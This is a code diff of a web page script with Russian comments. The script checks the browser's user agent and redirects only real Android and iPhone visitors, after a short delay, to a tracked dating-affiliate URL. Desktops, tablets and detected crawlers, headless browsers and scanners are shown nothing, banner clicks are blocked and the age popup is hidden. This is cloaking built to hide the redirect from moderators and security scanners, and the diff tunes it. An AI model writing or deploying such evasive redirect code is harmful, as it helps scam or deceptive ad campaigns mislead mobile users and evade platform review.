@@ -60,7 +60,6 @@ header h1{
   z-index: 2;
   background: transparent;
 }
-/* 18+ POPUP */
 .popup {
   position: fixed;
   top: 0; left: 0;
@@ -119,7 +118,6 @@ header h1{
   </a>
 </div>
 
-<!-- 18+ POPUP (на всякий случай скрыт) -->
 <div class="popup" id="agePopup">
   <div class="popup-box">
     <h2>Are you 18 years old?</h2>
@@ -131,66 +129,59 @@ header h1{
 <script>
 const mobileRedirectUrl = "https://grzvkg.datingcorrner.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2185091";
 
-/* ---------- Только настоящие телефоны (Android / iOS) ---------- */
 function isRealPhone() {
   const ua = (navigator.userAgent || "").toLowerCase();
 
-  // Исключаем всё, что не телефон
-  if (/windows|macintosh|mac os|linux|cros|ubuntu|fedora|debian|chromeos/i.test(ua)) {
+  // Сразу отсекаем десктопы
+  if (/windows|macintosh|mac os x|linux|cros|chromeos|ubuntu|fedora|debian/i.test(ua)) {
     return false;
   }
 
-  // Только Android телефоны (не планшеты)
-  if (/android/i.test(ua)) {
-    // Исключаем планшеты
-    if (/tablet|pad|nexus 7|nexus 9|nexus 10|sm-t|gt-p|tab/i.test(ua)) {
-      return false;
-    }
+  // Android телефон (не планшет)
+  if (/android/i.test(ua) && !/tablet|pad|sm-t|gt-p|nexus 7|nexus 9|nexus 10|tab/i.test(ua)) {
     return true;
   }
 
-  // Только iPhone / iPod (не iPad)
+  // iPhone / iPod
   if (/iphone|ipod/i.test(ua)) {
     return true;
   }
 
-  // Всё остальное (iPad, неизвестные, боты и т.д.) — нет
   return false;
 }
 
-/* ---------- Боты ---------- */
-function isBot() {
+// Очень мягкая проверка бота — только самые явные
+function isObviousBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
-  const botPatterns = [
-    /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
-    /googlebot/i, /bingbot/i, /yandex/i, /baidu/i, /duckduck/i,
-    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
-    /semrush/i, /ahrefs/i, /mj12bot/i, /dotbot/i,
-    /headless/i, /phantom/i, /selenium/i, /puppeteer/i,
-    /playwright/i, /webdriver/i, /chrome-lighthouse/i,
-    /python-requests/i, /curl/i, /wget/i, /httpclient/i,
-    /scrapy/i, /axios/i, /node-fetch/i
-  ];
-  return botPatterns.some(p => p.test(ua)) || navigator.webdriver === true;
+  
+  // Только самые очевидные боты
+  if (/googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebookexternalhit|twitterbot|linkedinbot|semrush|ahrefs|mj12bot|dotbot|headlesschrome|phantomjs|selenium|puppeteer|playwright|webdriver|python-requests|curl\/|wget|scrapy/i.test(ua)) {
+    return true;
+  }
+  
+  // webdriver только если он явно true
+  if (navigator.webdriver === true) {
+    return true;
+  }
+
+  return false;
 }
 
-/* ---------- Основная логика ---------- */
 const isPhone = isRealPhone();
-const bot = isBot();
+const bot = isObviousBot();
 
-console.log("[Debug] isRealPhone:", isPhone, "| isBot:", bot);
+console.log("%c[Debug]", "color: #0f0; font-weight: bold", "isRealPhone:", isPhone, "| isBot:", bot);
+console.log("%c[UA]", "color: #0ff", navigator.userAgent);
 
 if (isPhone && !bot) {
-  // Только настоящий телефон → редирект
-  console.log("[Redirect] Real phone detected → redirecting...");
+  console.log("%c[Redirect]", "color: #0f0", "Real phone → redirecting in 300ms");
   setTimeout(() => {
     window.location.replace(mobileRedirectUrl);
-  }, 1300);
+  }, 300);
 } else {
-  // Десктоп / Windows / Mac / неизвестные / боты / планшеты → ничего не делаем
-  console.log("[Blocked] Not a real phone — do nothing");
+  console.log("%c[Blocked]", "color: #f00", "Not a real phone or bot — do nothing");
 
-  // Блокируем все клики по баннерам
+  // Блокируем клики
   document.querySelectorAll('.banner').forEach(banner => {
     banner.addEventListener('click', function(e) {
       e.preventDefault();
@@ -199,7 +190,7 @@ if (isPhone && !bot) {
     });
   });
 
-  // Скрываем попап на всякий случай
+  // Скрываем попап
   const popup = document.getElementById('agePopup');
   if (popup) popup.style.display = 'none';
 }
